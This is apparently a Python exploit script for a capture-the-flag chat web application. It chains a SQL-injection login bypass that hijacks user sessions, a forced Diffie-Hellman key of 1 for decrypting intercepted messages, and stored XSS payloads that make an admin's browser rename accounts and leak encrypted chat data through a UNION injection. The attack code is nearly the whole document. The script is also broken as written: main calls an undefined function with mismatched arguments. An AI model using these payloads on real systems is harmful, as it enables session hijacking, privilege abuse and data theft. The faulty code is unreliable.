#!/usr/bin/env python3
"""
exploit_sc3.py

1) Re-uses your DH=1 MITM technique to discover Sharon's username.
2) Plants an admin-XSS payload into Alice's chat (as Mallory) that will:
   - rename bob -> <sharon_username>
   - rename sharon -> <prefix><sharon_username>
   The XSS runs in Alice's automated browser (Alice is admin), so those are admin actions.
3) Logs everything verbosely so you can debug step-by-step.
4) Prints a brute-force template and the exact payloads used.
"""
import requests, time, re, sys
import urllib.parse
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

BASE = "http://10.0.0.1"
BLOCK = 16

EXFIL_HOST = "10.0.0.5"
EXFIL_PORT = 9000

def sqli_session(user_prefix):
    r = requests.post(f"{BASE}/login",
                      data={"username": f"' OR username LIKE '{user_prefix}%'--",
                            "password": "x"},
                      allow_redirects=False)
    return r.cookies.get("session")

def post(sess, to_user, msg):
    return requests.post(f"{BASE}/chat/{to_user}",
                         cookies={"session": sess},
                         data={"message": msg}, timeout=5)

def get(sess, with_user):
    return requests.get(f"{BASE}/chat/{with_user}",
                        cookies={"session": sess}, timeout=5).text

def try_decrypt_hexlines(html, key_bytes):
    out = []
    for enc in re.findall(r'\b[0-9a-f]{32,}\b', html):
        if len(enc) % 32 != 0:
            continue
        try:
            pt = unpad(AES.new(key_bytes, AES.MODE_ECB)
                       .decrypt(bytes.fromhex(enc)), 16).decode()
            out.append(pt)
        except ValueError:
            continue
    return out

def find_sharon_username(mallory_session, bob_session, timeout=300):
    """
    Poll bob->alice conversation (decrypting with DH=1 key) until we find the line:
      "Oh, it was 'sharon...'."
    Return the sharon plaintext username or None.
    """
    key = (1).to_bytes(256, "big")[:16]
    seen = set()
    print("[*] Searching for Sharon's username (this may take up to {}s)".format(timeout))
    for _ in range(timeout):
        # keep spamming bob -> alice '1.' so DH stays fake
        post(bob_session, "alice", "Hey Alice, sure: 1.")
        page = get(bob_session, "alice")
        pts = try_decrypt_hexlines(page, key)
        for m in pts:
            if m not in seen:
                seen.add(m)
                print("[decoded] ", m)
                if "it was '" in m:
                    match = re.search(r"it was '([^']+)'", m)
                    if match:
                        sh = match.group(1)
                        print("[+] Found Sharon username:", sh)
                        return sh
        time.sleep(1)
    return None

def build_xss_payload_DH_A(mallory, bob):
    # Step 1: Plant looping-XSS to spam Alice's DH_A=1.
    xss = (
        '<script>(async()=>{try{'
        "await fetch('/chat/bob',{method:'POST',credentials:'include',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'message='+encodeURIComponent(\"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: 1.\")});"
        "}catch(e){}})();</script>"
    )
    post(mallory, "alice", xss)

    # Step 2: Trigger Alice's automation
    post(mallory, "alice", "I heard someone shared the flag with Bob!")

    # Step 3: Wait for Alice's forged dh_A
    print("[+] Waiting for Alice's forged dh_A...")
    for _ in range(30):
        if "DHE-AES: 1." in get(bob, "alice"):
            print("[+] Saw dh_A=1. from Alice!")
            break
        time.sleep(1)
    else:
        print("[-] Never saw forged dh_A"); return


def build_admin_xss_payload(old_username: str, new_username: str) -> str:
    """
    Return an XSS payload that renames old_username -> new_username
    by making Alice (admin) submit the /user/<old>/modify form.
    """
    return f"""<script>
fetch('/user/{old_username}/modify', {{
  method: 'POST',
  credentials: 'include',
  headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
  body: 'username={new_username}'
}});
</script>"""

def build_rename_then_leak_payload(old_username: str,
                                   new_username: str,
                                   exfil_to: str = "mallory",
                                   where_clause: str = "encrypted_username_1 IS NULL OR encrypted_username_2 IS NULL") -> str:
    """
    1) POST rename /user/<old>/modify with username=<new>
    2) GET /user/<UNION>/modify to UNION-select encrypted_contents
    3) Exfil via Alice->exfil_to chat as 'LEAK:<hex>'
    """
    inj = "' UNION SELECT encrypted_contents, 'x', 0 FROM encrypted_chats WHERE " + where_clause + " LIMIT 1 -- "
    encoded = urllib.parse.quote(inj, safe='')
    return f"""<script>
(async () => {{
  try {{
    // 1) rename real user
    await fetch('/user/{old_username}/modify', {{
      method: 'POST',
      credentials: 'include',
      headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
      body: 'username={urllib.parse.quote(new_username)}'
    }});

    // small settle delay so the UPDATE/COMMIT definitely finishes
    await new Promise(r => setTimeout(r, 400));

    // 2) leak via UNION on GET (now reads updated DB state)
    const res = await fetch('/user/{encoded}/modify', {{ method: 'GET', credentials: 'include' }});
    const text = await res.text();

    // Pull a long hex-looking blob (encrypted_contents) from the HTML
    // (safer than a generic value="..." match)
    const m = text.match(/[0-9a-f]{{64,}}/i);
    const leaked = m ? m[0] : 'NO_HEX_MATCH';

    // 3) exfil to our own chat so Mallory can read it
    await fetch('/chat/{exfil_to}', {{
      method: 'POST',
      credentials: 'include',
      headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
      body: 'message=' + encodeURIComponent('LEAK:' + leaked)
    }});
  }} catch (e) {{
    await fetch('/chat/{exfil_to}', {{
      method: 'POST',
      credentials: 'include',
      headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
      body: 'message=' + encodeURIComponent('LEAK_ERR:' + (e && e.toString()))
    }});
  }}
}})();
</script>"""


def main():
    print("[*] starting exploit (SC3) — verbose logs ON")

    mallory = sqli_session("mallory")
    bob = sqli_session("bob")
    if not mallory or not bob:
        print("[-] Failed to get sessions for Mallory or Bob.")
        return

    print("[+] Mallory session:", mallory)
    print("[+] Bob session:", bob)

    # Step 1: find sharon
    build_xss_payload_DH_A(mallory, bob)

    sharon = find_sharon_username(mallory, bob, timeout=300)
    if not sharon:
        print("[-] Could not recover Sharon username — aborting.")
        return

    #payload = build_admin_xss_payload("bob", sharon)
    payload = build_rename_and_leak_payload("bob", sharon, EXFIL_HOST, EXFIL_PORT)
    post(mallory, "alice", payload)
    print("[+] Changed bob username to sharon, check the chat")


if __name__ == "__main__":
    main()
